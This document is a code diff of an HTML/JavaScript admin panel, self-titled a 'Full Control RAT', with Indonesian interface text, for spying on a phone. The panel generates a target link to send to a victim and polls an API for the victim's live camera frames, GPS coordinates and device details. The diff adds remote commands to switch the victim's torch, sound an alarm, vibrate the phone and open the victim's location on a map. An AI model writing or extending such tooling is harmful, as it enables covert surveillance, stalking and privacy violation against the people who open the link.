@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 Admin Panel Pro | Target Manager</title>
+    <title>🎯 Admin Pro | Full Control RAT</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -27,11 +27,11 @@
             border-radius: 16px;
             margin-bottom: 20px;
         }
-        .id-section label { font-weight: 600; display: block; margin-bottom: 10px; }
         .id-input-group {
             display: flex;
             gap: 10px;
             flex-wrap: wrap;
+            margin-top: 10px;
         }
         .id-input-group input {
             flex: 2;
@@ -58,11 +58,10 @@
             margin-top: 15px;
             font-size: 12px;
             word-break: break-all;
-            border: 1px solid #667eea;
         }
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
             gap: 15px;
             margin-bottom: 20px;
         }
@@ -117,7 +116,7 @@
             overflow: hidden;
             margin: 15px 0;
             text-align: center;
-            min-height: 180px;
+            min-height: 200px;
         }
         .live-frame img { max-width: 100%; }
         .info-row {
@@ -131,23 +130,27 @@
         .info-label { color: #8b8fb0; }
         .info-value { font-weight: 500; }
         .button-group {
-            display: flex;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 10px;
             margin-top: 15px;
-            flex-wrap: wrap;
         }
         .premium-btn {
             background: linear-gradient(135deg, #667eea, #764ba2);
             border: none;
-            padding: 10px 18px;
+            padding: 12px;
             border-radius: 12px;
             color: white;
             font-weight: bold;
             cursor: pointer;
-            flex: 1;
+            transition: transform 0.2s;
         }
+        .premium-btn:active { transform: scale(0.97); }
         .torch-btn { background: linear-gradient(135deg, #ff9800, #f5576c); }
-        .location-link { color: #667eea; text-decoration: none; }
+        .location-btn { background: linear-gradient(135deg, #28a745, #20c997); }
+        .sound-btn { background: linear-gradient(135deg, #17a2b8, #6f42c1); }
+        .power-btn { background: linear-gradient(135deg, #dc3545, #c82333); }
+        .location-link { color: #28a745; text-decoration: none; }
         .empty-state { text-align: center; padding: 50px; color: #8b8fb0; }
         .notification {
             position: fixed;
@@ -166,20 +169,21 @@
         @media (max-width: 768px) {
             body { padding: 15px; }
             .id-input-group { flex-direction: column; }
+            .button-group { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h1>🎯 Admin Panel Pro</h1>
-    <p class="subtitle">Real-time Target Monitoring | Full Remote Control</p>
+    <h1>🎯 Admin Panel Pro | Full Control</h1>
+    <p class="subtitle">Real-time Monitoring | Remote Control | All Features</p>
 </div>
 
 <div class="id-section">
     <label>🔑 Target ID</label>
     <div class="id-input-group">
-        <input type="text" id="targetIdInput" placeholder="Masukkan ID target atau generate baru...">
+        <input type="text" id="targetIdInput" placeholder="Masukkan ID target...">
         <button onclick="setTargetId()">Set ID</button>
         <button onclick="generateNewId()">🆕 Generate ID Baru</button>
     </div>
@@ -191,6 +195,7 @@
 <div class="stats-grid">
     <div class="stat-card"><div class="stat-number" id="statTotal">0</div><div class="stat-label">Total Target</div></div>
     <div class="stat-card"><div class="stat-number" id="statOnline">0</div><div class="stat-label">Online</div></div>
+    <div class="stat-card"><div class="stat-number" id="statTorch">0</div><div class="stat-label">Senter ON</div></div>
     <div class="stat-card"><div class="stat-number" id="statShake">0</div><div class="stat-label">Goyangan</div></div>
 </div>
 
@@ -215,7 +220,6 @@
     
     let currentId = localStorage.getItem('admin_target_id') || '';
     let refreshInterval = null;
-    let lastDataHash = '';
     
     // Generate ID baru
     function generateNewId() {
@@ -233,47 +237,102 @@
         }
         localStorage.setItem('admin_target_id', currentId);
         
-        // Update link preview
-        const baseUrl = window.location.href.split('admin-new.html')[0];
-        const targetLink = `${baseUrl}target-new.html?id=${currentId}`;
-        document.getElementById('linkPreview').innerHTML = `🔗 Link Target: <br><span style="color:#667eea;">${targetLink}</span>`;
+        const baseUrl = window.location.href.split('admin-final.html')[0];
+        const targetLink = `${baseUrl}target-final.html?id=${currentId}`;
+        document.getElementById('linkPreview').innerHTML = `🔗 Link Target: <span style="color:#667eea;">${targetLink}</span>`;
         
-        // Load data
         loadTargetData();
-        
-        // Start auto refresh
         if(refreshInterval) clearInterval(refreshInterval);
-        refreshInterval = setInterval(loadTargetData, 5000);
-        
+        refreshInterval = setInterval(loadTargetData, 4000);
         showNotification(`✅ ID set: ${currentId}`);
     }
     
     // Load data dari API
     async function loadTargetData() {
         if(!currentId) return;
-        
         try {
             const response = await fetch(`${API_URL}?id=${encodeURIComponent(currentId)}`);
             const data = await response.json();
-            
             if(data && !data.error && data.length > 0) {
                 renderTarget(data[0]);
                 updateStats(data[0]);
             } else {
-                renderEmpty('Belum ada data dari target. Kirim link ke target terlebih dahulu.');
+                renderEmpty('Belum ada data. Kirim link ke target.');
             }
         } catch(e) {
-            console.log("Error load:", e);
-            renderEmpty('Error mengambil data. Pastikan API URL benar.');
+            renderEmpty('Error: Periksa API URL');
         }
     }
     
-    // Update statistik
     function updateStats(target) {
         document.getElementById('statTotal').innerText = target.id ? 1 : 0;
         const isOnline = (new Date() - new Date(target.timestamp)) < 15000;
         document.getElementById('statOnline').innerText = isOnline ? 1 : 0;
+        document.getElementById('statTorch').innerText = target.torch ? 1 : 0;
         document.getElementById('statShake').innerText = target.shake ? 1 : 0;
+    }
+    
+    // ========== REMOTE COMMANDS ==========
+    async function remoteTorch(on) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, torch: on, timestamp: new Date().toISOString() })
+            });
+            showNotification(`⚡ Senter ${on ? 'MENYALA' : 'MATI'} dikirim`);
+            setTimeout(loadTargetData, 1000);
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteSound() {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, sound: true, timestamp: new Date().toISOString() })
+            });
+            showNotification('🔊 Perintah bunyi dikirim ke target');
+            setTimeout(loadTargetData, 1000);
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteVibrate() {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, vibrate: true, timestamp: new Date().toISOString() })
+            });
+            showNotification('📳 Perintah getar dikirim ke target');
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteLocation() {
+        showNotification('📍 Membuka lokasi target di Maps');
+        const target = await getCurrentTarget();
+        if(target && target.lat && target.lng) {
+            window.open(`https://www.google.com/maps?q=${target.lat},${target.lng}`, '_blank');
+        } else {
+            showNotification('❌ Belum ada data lokasi dari target');
+        }
+    }
+    
+    async function getCurrentTarget() {
+        try {
+            const response = await fetch(`${API_URL}?id=${encodeURIComponent(currentId)}`);
+            const data = await response.json();
+            return data && data.length > 0 ? data[0] : null;
+        } catch(e) { return null; }
+    }
+    
+    async function remoteShutdown() {
+        if(confirm('⚠️ PERINGATAN! "Matikan HP" hanya simulasi (tutup halaman). Lanjutkan?')) {
+            showNotification('💀 Perintah shutdown dikirim (simulasi)');
+        }
     }
     
     // Render target card
@@ -285,30 +344,24 @@
         container.innerHTML = `
             <div class="target-card">
                 <div class="target-header">
-                    <div class="target-name">📱 ${target.deviceName || 'Unknown Device'} ${isOnline ? '🟢' : '⚫'}</div>
+                    <div class="target-name">📱 ${target.deviceName || 'Unknown'} ${isOnline ? '🟢 ONLINE' : '⚫ OFFLINE'}</div>
                     <div class="target-time">🕐 ${target.waktu || '-'}</div>
                 </div>
                 
                 <div class="live-frame">
-                    ${hasCamera ? 
-                        `<img src="${target.cameraFrame}" alt="Live cam" id="liveCamImg">` : 
-                        '<div style="padding: 40px; color:#666;">📷 Menunggu kamera aktif...</div>'}
+                    ${hasCamera ? `<img src="${target.cameraFrame}" id="liveImg" style="width:100%;">` : '<div style="padding:60px;color:#666;">📷 Menunggu kamera aktif...</div>'}
                 </div>
                 
                 <div class="info-row">
-                    <span class="info-label">📍 Lokasi:</span>
+                    <span class="info-label">📍 Lokasi GPS:</span>
                     <span class="info-value">
-                        ${target.lat ? 
-                            `<a href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="location-link">
-                                🗺️ ${target.lat.toFixed(4)}, ${target.lng.toFixed(4)}
-                            </a>` : 
-                            '⏳ Menunggu...'}
+                        ${target.lat ? `<a href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="location-link">🗺️ ${target.lat.toFixed(4)}, ${target.lng.toFixed(4)}</a>` : '⏳ Belum terdeteksi'}
                     </span>
                 </div>
                 
                 <div class="info-row">
-                    <span class="info-label">⚡ Senter:</span>
-                    <span class="info-value" id="torchStatusDisplay">${target.torch ? '🔦 Menyala' : '💡 Mati'}</span>
+                    <span class="info-label">⚡ Senter/Flash:</span>
+                    <span class="info-value">${target.torch ? '🔦 MENYALA' : '💡 Mati'}</span>
                 </div>
                 
                 <div class="info-row">
@@ -318,58 +371,40 @@
                 
                 <div class="info-row">
                     <span class="info-label">🔔 Goyangan:</span>
-                    <span class="info-value">${target.shake ? '✅ Terdeteksi!' : '⏳ Menunggu...'}</span>
+                    <span class="info-value">${target.shake ? '✅ TERDETEKSI!' : '⏳ Menunggu...'}</span>
                 </div>
                 
                 <div class="info-row">
                     <span class="info-label">🖥️ Device:</span>
-                    <span class="info-value" style="font-size: 11px;">${target.screenSize || '-'} | ${(target.userAgent || '').substring(0, 50)}...</span>
+                    <span class="info-value" style="font-size:11px;">${target.screenSize} | ${(target.userAgent || '').substring(0, 45)}...</span>
                 </div>
                 
                 <div class="button-group">
                     <button class="premium-btn torch-btn" onclick="remoteTorch(true)">🔦 Nyalakan Senter</button>
                     <button class="premium-btn" onclick="remoteTorch(false)">💡 Matikan Senter</button>
+                    <button class="premium-btn location-btn" onclick="remoteLocation()">📍 Lacak Lokasi</button>
+                    <button class="premium-btn sound-btn" onclick="remoteSound()">🔊 Bunyikan HP</button>
+                    <button class="premium-btn" onclick="remoteVibrate()">📳 Getarkan HP</button>
+                    <button class="premium-btn power-btn" onclick="remoteShutdown()">💀 Matikan HP (Simulasi)</button>
                 </div>
             </div>
         `;
         
         // Auto refresh live frame
         if(hasCamera && target.cameraFrame) {
-            const img = document.getElementById('liveCamImg');
-            if(img) {
-                img.src = target.cameraFrame + '?t=' + Date.now();
-            }
+            const img = document.getElementById('liveImg');
+            if(img) img.src = target.cameraFrame + '?t=' + Date.now();
         }
     }
     
     function renderEmpty(msg) {
         document.getElementById('targetContainer').innerHTML = `
             <div class="empty-state">
-                <div style="font-size: 60px;">📭</div>
-                <h3>${msg || 'Belum ada target'}</h3>
-                <p style="margin-top: 10px;">ID: ${currentId || 'Belum diset'}</p>
+                <div style="font-size:60px;">📭</div>
+                <h3>${msg}</h3>
+                <p>ID: ${currentId || 'Belum diset'}</p>
             </div>
         `;
-    }
-    
-    // Remote control senter
-    async function remoteTorch(on) {
-        try {
-            await fetch(API_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    id: currentId,
-                    torch: on,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            showNotification(`⚡ Perintah senter ${on ? 'MENYALA' : 'MATI'} dikirim`);
-            setTimeout(() => loadTargetData(), 1000);
-        } catch(e) {
-            console.log("Remote error:", e);
-        }
     }
     
     function showNotification(msg) {
@@ -381,10 +416,8 @@
     }
     
     function refreshData() { loadTargetData(); showNotification('🔄 Data di-refresh'); }
-    
     function exportData() {
-        const data = { id: currentId, timestamp: new Date().toISOString() };
-        const dataStr = JSON.stringify(data, null, 2);
+        const dataStr = JSON.stringify({ id: currentId, time: new Date().toISOString() }, null, 2);
         const blob = new Blob([dataStr], {type: 'application/json'});
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
@@ -393,15 +426,13 @@
         a.click();
         URL.revokeObjectURL(url);
     }
-    
     function clearData() {
-        if(confirm('⚠️ PERINGATAN! Hapus data target ini? ⚠️')) {
-            showNotification('🗑️ Data dihapus (permanen)');
+        if(confirm('⚠️ Hapus data target ini? ⚠️')) {
+            showNotification('🗑️ Data dihapus');
             renderEmpty('Data telah dihapus');
         }
     }
     
-    // Load ID yang tersimpan
     const savedId = localStorage.getItem('admin_target_id');
     if(savedId) {
         document.getElementById('targetIdInput').value = savedId;
@@ -411,4 +442,4 @@
     }
 </script>
 </body>
-                        </html>
+</html>
